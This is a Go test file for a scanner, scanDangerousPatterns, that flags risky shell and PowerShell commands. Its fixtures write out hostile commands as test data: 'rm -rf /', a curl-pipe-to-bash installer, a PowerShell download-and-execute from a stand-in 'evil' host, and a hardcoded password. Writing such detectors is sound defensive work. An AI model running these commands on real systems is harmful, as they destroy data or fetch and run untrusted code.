package capabilities

import (
	"strings"
	"testing"
)

func TestScanDangerousPatternsCleanScript(t *testing.T) {
	clean := `#!/bin/bash
set -euo pipefail
echo "starting maintenance"
systemctl restart nginx
echo "done"
`
	hits := scanDangerousPatterns(clean)
	if len(hits) > 0 {
		t.Errorf("expected clean script to pass, got hits: %v", hits)
	}
}

func TestScanDangerousPatternsRmRf(t *testing.T) {
	bad := `rm -rf /tmp/something
rm -rf / # nope`
	hits := scanDangerousPatterns(bad)
	if len(hits) == 0 {
		t.Error("expected rm -rf / to be flagged")
	}
}

func TestScanDangerousPatternsCurlPipe(t *testing.T) {
	bad := `curl -fsSL https://example.com/install.sh | bash`
	hits := scanDangerousPatterns(bad)
	if len(hits) == 0 {
		t.Error("expected curl|bash to be flagged")
	}
}

func TestScanDangerousPatternsPowerShellInjection(t *testing.T) {
	bad := `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil/script.ps1')`
	hits := scanDangerousPatterns(bad)
	if len(hits) == 0 {
		t.Error("expected IEX New-Object to be flagged")
	}
}

func TestScanDangerousPatternsSudo(t *testing.T) {
	bad := `sudo systemctl restart nginx`
	hits := scanDangerousPatterns(bad)
	found := false
	for _, h := range hits {
		if strings.Contains(strings.ToLower(h), "sudo") {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected sudo to be flagged")
	}
}

func TestScanDangerousPatternsCredentialPlaceholder(t *testing.T) {
	bad := `PASSWORD=hunter2
echo "logging in with $PASSWORD"`
	hits := scanDangerousPatterns(bad)
	found := false
	for _, h := range hits {
		if strings.Contains(h, "PASSWORD=") {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected PASSWORD= to be flagged")
	}
}

func TestScanDangerousPatternsEmpty(t *testing.T) {
	if hits := scanDangerousPatterns(""); len(hits) != 0 {
		t.Errorf("empty code must return no hits, got %v", hits)
	}
}

func TestScanDangerousPatternsCaseInsensitive(t *testing.T) {
	// Substrings are matched case-insensitively. Regexps are case-aware
	// (some have explicit (?i)). RM -RF should still hit.
	bad := `RM -RF /`
	hits := scanDangerousPatterns(bad)
	if len(hits) == 0 {
		t.Error("expected uppercase RM -RF to be flagged")
	}
}
